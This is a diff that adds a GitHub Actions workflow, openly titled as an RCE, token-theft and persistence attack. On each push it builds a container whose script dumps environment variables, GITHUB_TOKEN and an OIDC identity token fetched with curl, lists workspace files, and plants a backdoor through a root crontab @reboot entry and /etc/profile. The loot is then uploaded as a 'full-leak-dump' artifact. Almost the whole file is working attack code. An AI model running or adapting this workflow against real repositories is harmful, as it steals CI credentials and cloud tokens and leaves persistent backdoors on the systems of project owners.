@@ -1,0 +1,62 @@
+name: Max Impact: RCE, Token Theft & Persistence
+on: [push]
+
+jobs:
+  rce:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Prepare Dockerfile
+        run: |
+          mkdir -p taskcluster/docker/python
+          cat <<'EOF' > taskcluster/docker/python/Dockerfile
+          FROM alpine
+          COPY run.sh /run.sh
+          RUN chmod +x /run.sh
+          CMD ["/run.sh"]
+          EOF
+
+      - name: Prepare Exploit Payload
+        run: |
+          cat <<'EOF' > taskcluster/docker/python/run.sh
+          #!/bin/sh
+          echo "[+] Dumping CI env and secrets..." > /leak.txt
+          echo "=== ENV ===" >> /leak.txt
+          printenv >> /leak.txt
+
+          echo "=== GITHUB_TOKEN ===" >> /leak.txt
+          echo "$GITHUB_TOKEN" >> /leak.txt
+
+          echo "=== OIDC ID Token ===" >> /leak.txt
+          curl -sSL "$ACTIONS_ID_TOKEN_REQUEST_URL" \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> /leak.txt || echo "OIDC fail" >> /leak.txt
+
+          echo "[+] Dumping repo files..." >> /leak.txt
+          ls -laR /github/workspace >> /leak.txt
+
+          echo "[+] Installing persistent runtime backdoor..."
+          echo '#!/bin/sh' > /usr/local/bin/init.sh
+          echo 'printenv >> /runtime.log' >> /usr/local/bin/init.sh
+          echo 'cat /github/workspace/** >> /runtime.log 2>/dev/null' >> /usr/local/bin/init.sh
+          chmod +x /usr/local/bin/init.sh
+          echo '@reboot /usr/local/bin/init.sh' >> /etc/crontabs/root
+          echo '/usr/local/bin/init.sh' >> /etc/profile
+          EOF
+
+      - name: Build compromised image
+        run: docker build -t final-rce ./taskcluster/docker/python
+
+      - name: Run container and extract leaked data
+        run: docker run --rm final-rce > output.txt
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: full-leak-dump
+          path: output.txt
